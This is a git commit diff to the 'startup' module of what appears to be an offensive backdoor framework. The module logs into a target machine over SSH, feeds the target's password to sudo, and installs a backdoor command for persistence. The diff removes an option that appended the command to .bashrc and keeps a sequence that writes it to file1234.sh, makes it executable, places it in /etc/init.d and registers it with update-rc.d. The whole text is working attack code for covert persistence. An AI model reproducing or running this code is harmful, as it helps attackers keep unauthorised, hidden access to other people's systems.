6394f21e7f6ed772624302608f24fb0f52554589
George Hughey <ghughey@umd.edu>
2016-12-30 21:19:28 -0800

    Split startup and bashrc

--- modules/startup.py
+++ modules/startup.py
@@ -8,17 +8,11 @@ class Startup(Module):
         self.name = "startup"
         self.backdoor = backdoor
         self.options = {
-                "bash": Option("bash", True, "Add to bashrc", False),
-                "init": Option("init", False, "Add to system startup", False),
                 }
 
     def exploit(self):
-        if(self.get_value("bash")):
-            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.backdoor.get_command() + " > /dev/null \' >> .bashrc")
-        if(self.get_value("init")):
-            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.backdoor.get_command() + "\' > file1234.sh")
-            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S chmod +x file1234.sh")
-            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv file1234.sh /etc/init.d/")
-            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S update-rc.d file1234.sh defaults")
+        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.backdoor.get_command() + "\' > file1234.sh")
+        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S chmod +x file1234.sh")
+        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv file1234.sh /etc/init.d/")
+        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S update-rc.d file1234.sh defaults")
         print(GOOD + self.name + " module success")
-
